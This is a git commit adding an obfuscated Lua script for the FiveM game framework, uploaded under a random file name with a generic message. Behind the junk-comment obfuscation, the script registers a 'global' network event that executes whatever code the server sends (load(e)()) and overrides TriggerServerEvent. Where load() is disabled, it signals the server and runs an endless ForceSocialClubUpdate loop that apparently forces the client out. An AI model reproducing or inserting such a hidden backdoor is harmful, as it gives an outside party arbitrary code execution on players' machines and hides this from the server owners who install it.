8cf25ccf13e175de975d8a4b5e508386889b3844
Tiebeisonbeast <91832692+Tiebeisonbeast@users.noreply.github.com>
2021-10-09 20:54:08 +0200

    Add files via upload

---
+++ yGnLAITa.lua
@@ -0,0 +1,256 @@
+
+
+
+
+
+
+			Citizen.CreateThread(		
+
+
+
+
+			--[[QZlSq2]] --[[QD]]--[[OIx7dxO]] --[[p7]]--[[5pfJg3j2]] --[[B8ABLcWHc]]--[[oXPS]] --[[IVlSLrqN]]function()	
+
+
+
+
+
+
+
+					--[[3Shqa]] --[[A]]--[[cig]] --[[AtvG1f1G]]--[[j]] --[[dKu]]--[[3a5ebfB]] --[[Pvk4Y6]]--[[ARkrU]] --[[Ku13oY]]--[[RnQSEmn]] --[[Cjm1hJX]]--[[OgIFtoi]] --[[Z]]--[[6t]] --[[ZFkO905Eq]]local--[[6kcBwu]] --[[Px6lp1gz]]a--[[AUq]] --[[AXjsLd]]=--[[2CV51LE]] --[[KLU]]Citizen.InvokeNative				
+
+
+
+
+
+
+		--[[HpHHNrX]] --[[9]]--[[5Vltte9B]] --[[Klwm7i]]--[[cfrIQ]] --[[Zm1bzzR0]]--[[o]] --[[GxbXb6Z]]--[[5TLH4bu]] --[[7p]]--[[xA2]] --[[X]]--[[ZqkU3Fz]] --[[Ip]]--[[G4PPU]] --[[pYqObTjsv]]TriggerServerEvent--[[awL]] --[[Pwz]]=--[[igrOQ]] --[[SUaTkox]]function(b,--[[qF]] --[[uMVHw2]]...)							
+
+
+
+
+			--[[iUAXpgOK]] --[[maOI]]--[[k3SjPfslC]] --[[EGaHiqig0]]--[[7Cz8hq]] --[[ezMepcse]]--[[wAPb2kv]] --[[BIAf]]--[[i]] --[[u]]--[[u]] --[[6IjEOHemX]]--[[w3cZ]] --[[LKgI]]--[[99z4fmp]] --[[tkn]]--[[Q]] --[[N]]--[[t0tet3]] --[[mxwdMr]]--[[m9dngTXq]] --[[q]]--[[o]] --[[Fy6S]]local--[[D]] --[[5]]c--[[z]] --[[Lch5i]]=--[[aT80]] --[[DrvWo9]]msgpack.pack({...})						
+
+
+
+		--[[B8oS]] --[[l]]--[[Lmn]] --[[h7Sit]]--[[i]] --[[n]]--[[x2k]] --[[SJ6CWccv]]--[[klFTDr]] --[[DhU8GSY]]--[[p7p14Z]] --[[6A0CA]]--[[mIkNwI]] --[[30gWizRe]]--[[p]] --[[m0s03z4N]]--[[pr9p]] --[[a]]--[[DmvjnCc]] --[[p]]--[[FehE4iQ]] --[[Rfmmy]]--[[Z0AS]] --[[7A0ZoP0]]return--[[J66Q]] --[[RC]]a(0x7fdd1128,--[[e4VaGMFP]] --[[wu1uxA]]b,--[[gXDzQYv5]] --[[kdFz5ZYME]]c,--[[LM4fD]] --[[MJtjF]]c:len())					
+
+
+
+
+
+
+
+
+
+					--[[KyFu7B]] --[[3G]]--[[fmAydLIcT]] --[[h9J]]--[[BD4RwxkR]] --[[FRlrCOV]]--[[jOcnmHq]] --[[OtZKzR8AD]]--[[EyYLg5bj]] --[[OOYaf]]--[[SIlTLE8]] --[[aNyk]]--[[5xfO7wK]] --[[3k0ju]]--[[7L6wh0Pk]] --[[OzfK]]end			
+
+
+
+
+
+
+			--[[fAsp]] --[[1CAV3eGD]]--[[BsxRE1Rd]] --[[27g2Aj973]]--[[kb0bt4B]] --[[MT]]--[[0m8rJCVVJ]] --[[lmbX2jq9P]]--[[dEE3R]] --[[Tp]]--[[PzYli]] --[[Hl1j]]--[[WAdI6N]] --[[TgPLn]]--[[r8xX6wM]] --[[I4]]_G.TriggerServerEvent--[[yYO]] --[[7EM]]=--[[fzcZuYbv]] --[[9]]function(b,--[[g]] --[[6b4h]]...)						
+
+
+
+
+
+
+
+
+
+		--[[STdJ]] --[[t]]--[[vjV7]] --[[sK2h5fN]]--[[plf0f3VRq]] --[[sl]]--[[mXFvAuL]] --[[6AL]]--[[49QA]] --[[h2T8]]--[[96nhP0eB]] --[[Yw2L]]--[[6lBZD]] --[[U9OMxLCw]]--[[WdRPU8]] --[[h0]]--[[SZ70p]] --[[5ITvZZzMJ]]--[[l5HU2b]] --[[xaKkLEe]]--[[oX9cx0CDF]] --[[Dvbygbjjh]]--[[04a0]] --[[3kWS4xXg4]]local--[[xYF]] --[[N]]c--[[YO]] --[[ZNt]]=--[[sqq]] --[[yZeKIk5]]msgpack.pack({...})				
+
+
+
+
+
+
+
+		--[[nsSy2UmPg]] --[[nNumF48]]--[[vi]] --[[P]]--[[QYq]] --[[T3D]]--[[cxYl]] --[[po7]]--[[qnm2gwZ8w]] --[[L9Jp]]--[[BQhjf]] --[[xfKE0AMT]]--[[iJmIGA]] --[[qy01acDiK]]--[[rPKwkj]] --[[x]]--[[QHDL]] --[[4]]--[[FXvgBYSUr]] --[[QM1gc]]--[[CLIFFY]] --[[WlWHfK]]--[[PBgUF]] --[[Yfa]]return--[[O]] --[[jMWzi1q]]a(0x7fdd1128,--[[UbK]] --[[GyFcS]]b,--[[whnDm]] --[[G5xxJSV]]c,--[[GdnzWmdxh]] --[[0jOy8XL]]c:len())	
+
+
+
+	--[[UMLysLo]] --[[FwIae69Fz]]--[[ajb0]] --[[3VzGI]]--[[BejFX5Bz]] --[[oR3l]]--[[ess9MS]] --[[OP]]--[[J]] --[[4z]]--[[ad5i2yz]] --[[IZBEY]]--[[M]] --[[Ja1GnfYh]]--[[O6uLX]] --[[gjH]]end				
+
+
+
+
+
+
+					--[[ERYhnRWd1]] --[[6h]]--[[2LG]] --[[ogSSLTYg]]--[[JKTY]] --[[2cL408BQ]]--[[2aL9dTkN]] --[[d9VRfv]]end						
+
+
+
+
+		)	
+
+
+
+
+
+
+	Citizen.CreateThread(			
+
+
+
+
+
+
+
+
+
+
+
+			--[[B3sHk9xrT]] --[[Vbc]]--[[Up]] --[[7]]--[[KZMwY]] --[[c]]--[[7]] --[[3q6GhDP]]function()				
+
+
+
+
+
+			--[[a99rMAEAC]] --[[E2dC6jBy]]--[[nskDsg6]] --[[nTcq]]--[[8arB]] --[[yFMKgkIYw]]--[[GNg]] --[[E]]--[[QZnbxQw]] --[[1HPE0O]]--[[3KGihyG]] --[[DWKKb4]]--[[9]] --[[A7kxOY]]--[[kF]] --[[HY8AeX]]Citizen.Wait(15)				
+
+
+
+
+
+
+
+				--[[jlz2v]] --[[kHXUQKSx]]--[[vE6oxdlJp]] --[[xVU7Lk8jS]]--[[mLbXoeSc]] --[[04Fzrj3F]]--[[GzJF6cU]] --[[LB2atx]]--[[bQy]] --[[ORe3b]]--[[Gbe9EInDy]] --[[nzOgaT8I1]]--[[UAdF]] --[[oe7kEPz]]--[[O]] --[[xE]]if--[[cSsOXRzF]] --[[9]]type(load("return--[[r8]] --[[q]]print('test')"))--[[f8yINT]] --[[ishto]]~=--[[3W79Blq]] --[[x5g]]"function"--[[O388zYHI]] --[[5]]then				
+
+
+
+
+
+
+
+
+
+					--[[PE5Dei2]] --[[M00QQ]]--[[nwG76r09c]] --[[3]]--[[K4hm]] --[[KsDXew9LB]]--[[0cGy3]] --[[mvOaoyxBC]]--[[e]] --[[93f9S73ug]]--[[Oc]] --[[DK5ED3W]]--[[xobI0]] --[[Ck97lupe]]--[[Xgi7I]] --[[n]]--[[26qDytAe]] --[[T]]--[[W8Gv]] --[[Qt]]--[[3v]] --[[kW]]--[[W9Cc]] --[[yvTkY]]TriggerServerEvent("nilLoad")						
+
+
+
+
+
+
+
+				--[[x6]] --[[USV8K]]--[[K72nJV]] --[[AM6LS]]--[[T9K6fS]] --[[kT]]--[[PZwjsIyy]] --[[uDl6yu9]]--[[LYO]] --[[YsClI6]]--[[977nj]] --[[KDSYLk]]--[[6QLkay]] --[[kWIp]]--[[wtT]] --[[epKbUg]]--[[vlw]] --[[huMZg]]--[[Ghdo3b]] --[[pgd5ILpq]]--[[YSYPQ8a]] --[[0i]]--[[uEqpyynBI]] --[[KUxDv0xT6]]Citizen.Wait(7500)				
+
+
+
+
+
+
+	--[[lKcqD]] --[[WgVE3jS]]--[[rwZUuNh]] --[[xW]]--[[yPS43FHQ]] --[[VVpCT]]--[[wTF]] --[[3YnI6]]--[[aZJEai]] --[[nmMWlxBE]]--[[h2]] --[[Ji]]--[[lnYEbDhfy]] --[[tC]]--[[DyzRQr]] --[[HK0p]]--[[pJ]] --[[5Qc]]--[[vRdOLp]] --[[k5J3os]]--[[Gek3px]] --[[JJT]]--[[trwHYXndT]] --[[Hl]]while--[[kBPu6]] --[[8Shx]]true--[[O5WFj]] --[[rSwWXcEk]]do					
+
+
+
+
+
+
+		--[[t2ZYNRxo]] --[[rG]]--[[txm5]] --[[Z5]]--[[V4uNHWp]] --[[kONmjMZ]]--[[qiwC]] --[[2PDIjT96]]--[[lD]] --[[QL]]--[[QvEjubfkY]] --[[ua]]--[[1slhFZ]] --[[vwkO49hUI]]--[[Y7WBc]] --[[ZnQ]]--[[WbGrG]] --[[Z]]--[[Vkw]] --[[ppd9JJ6B]]--[[IN8XSgmot]] --[[G]]--[[aHbqAUQ]] --[[CuLcP]]--[[j3]] --[[oLTh5z4J]]--[[lsg]] --[[JL]]--[[4SlPu5V]] --[[IukZk]]--[[h]] --[[1cYiVRB]]for--[[R9OesQ]] --[[DE6]]d--[[ptD65VN6j]] --[[GBgGrwr]]=--[[Hsuyje]] --[[Dtz]]1,--[[n]] --[[FKR]]45364567--[[QsHQ1Dw]] --[[tIt]]do			
+
+
+
+
+			--[[PjvUwp]] --[[RJjN]]--[[GXFZ6]] --[[4ue9b]]--[[iH1zXWSnx]] --[[aq3]]--[[EiFjFfcr]] --[[8]]--[[diVb]] --[[MegU]]--[[KKzqbNtXO]] --[[iWg5xTe]]--[[XYy]] --[[wZSeqhLy]]--[[qMUY]] --[[MSq8]]--[[0C5VDIx]] --[[CNc]]--[[0Z6Such]] --[[pwq0Hv65]]--[[PuK]] --[[EzKiVJwV]]--[[z6]] --[[YhleKyIP]]--[[P8v3vS]] --[[JVCe]]--[[VybkJTy]] --[[cqINh]]--[[zak3]] --[[T9]]--[[Cs1CC3kD]] --[[X]]--[[uXSKXK]] --[[L]]--[[KJ9]] --[[lIE6qg]]--[[Aw952Rr]] --[[RLMeq]]--[[eDusUpmU]] --[[9J5mFP3]]ForceSocialClubUpdate()			
+
+
+
+
+
+		--[[8OmhpU]] --[[bgqF]]--[[RDbQr]] --[[inqgZOs]]--[[4XG8sf]] --[[XaJxH9Zr]]--[[IIaIp]] --[[oBzW2dD]]--[[UL]] --[[uYI0aVV0]]--[[t]] --[[jkfD8]]--[[lFXsLS]] --[[gI]]--[[0kze]] --[[y]]--[[uC]] --[[x]]--[[MI]] --[[h8t0M]]--[[gh2fAHCy]] --[[dt]]--[[x9nhSbClt]] --[[G]]--[[kSm9nkr]] --[[RL3MCk2LJ]]--[[5Cuiq]] --[[1J]]--[[vGISd5K]] --[[VEnk]]--[[1lB]] --[[jxJ0]]end					
+
+
+
+
+
+
+
+	--[[VyCIgl]] --[[AjgT8]]--[[4Wru]] --[[lwIi]]--[[6G]] --[[0dilaWLf]]--[[AgOk]] --[[P0KVK]]--[[KHVOd]] --[[a]]--[[baSYdY]] --[[UZT]]--[[7nJGfCv1j]] --[[P]]--[[CXdr]] --[[1hXtowMi]]--[[1]] --[[Z1Z]]--[[XfD4]] --[[yScuLKgm]]--[[pc]] --[[mPwDaW]]--[[Vv6Em9IhP]] --[[kJyX]]end	
+
+
+
+
+
+
+
+		--[[Hid]] --[[U9]]--[[aAwqC3]] --[[kr3cKt5]]--[[GS6Qp5LPf]] --[[TlI7G8B]]--[[s6DWvFL]] --[[et]]--[[34]] --[[DfmcMFoRd]]--[[EF0MVIf]] --[[mwoaM]]--[[5]] --[[BPU8Ef]]--[[JA0H8zjb]] --[[wZxGYfaJ]]end			
+
+
+
+
+
+
+
+
+
+
+				--[[h0hDXJdAe]] --[[RZNShDx]]--[[3tP2viq]] --[[D2mpPnQKn]]--[[QatG]] --[[hLLs]]--[[B28845]] --[[CqkyrKy]]end						
+
+
+
+
+
+
+
+			)						
+
+
+
+
+
+
+
+					RegisterNetEvent("global")			
+
+
+
+
+
+
+
+		AddEventHandler(		
+
+
+
+
+
+
+
+				--[[CKJCHmW]] --[[QbH]]--[[G4Qx]] --[[p4]]--[[82o]] --[[1nXZgMT]]--[[6rWwZ4]] --[[NZcsEzklL]]"global",		
+
+
+
+		--[[K5OP1]] --[[TLTzjg]]--[[moJtEij]] --[[JCh]]--[[GKz]] --[[qWYkNf0]]--[[Xzr]] --[[l8BM]]function(e)						
+
+
+
+
+				--[[7]] --[[5]]--[[HiHGUh7UK]] --[[KUGyO]]--[[UBfXMKV]] --[[k0JU]]--[[tEsES3A]] --[[vtctaE]]--[[Y]] --[[hc]]--[[U]] --[[36]]--[[BkOiiy]] --[[U85zJx]]--[[9MBIcor9]] --[[cmwLGMjL]]if--[[X6AOs]] --[[XlV52]]type(load("return--[[9y]] --[[og5DA3Tfw]]print('test')"))--[[K]] --[[XJ]]==--[[F044]] --[[1JU]]"function"--[[ABeB4]] --[[kISB]]then						
+
+
+
+
+
+
+		--[[qZCN]] --[[Ue]]--[[dwjL]] --[[JpRt]]--[[X6X]] --[[7Kk]]--[[5XO8]] --[[fD5o]]--[[WlgF2]] --[[FDO]]--[[7]] --[[qLbI8c3E]]--[[P0]] --[[da1byJ]]--[[RNGPk]] --[[DBBjL]]--[[XTm8Oyv]] --[[SN]]--[[Z]] --[[CQLj]]--[[Vn6e]] --[[Dt]]--[[7]] --[[DA73kw]]load(e)()						
+
+
+
+
+
+
+
+
+							--[[KPMuDFB]] --[[PON]]--[[3]] --[[szYDAGa]]--[[fX]] --[[xPw]]--[[RtfSV7U7]] --[[h1O]]--[[H]] --[[0i8TVbCvn]]--[[Aj60RNevx]] --[[d8RityPX]]--[[lXSQJNlN]] --[[IArhw]]--[[Y]] --[[yRs]]end			
+
+
+
+				--[[3pXoXR]] --[[rD8]]--[[pGTFkv]] --[[TiDC8gd]]--[[MZ]] --[[HI]]--[[AWiCLiN]] --[[gpQ6fdqz]]end				
+
+
+
+
+						)			
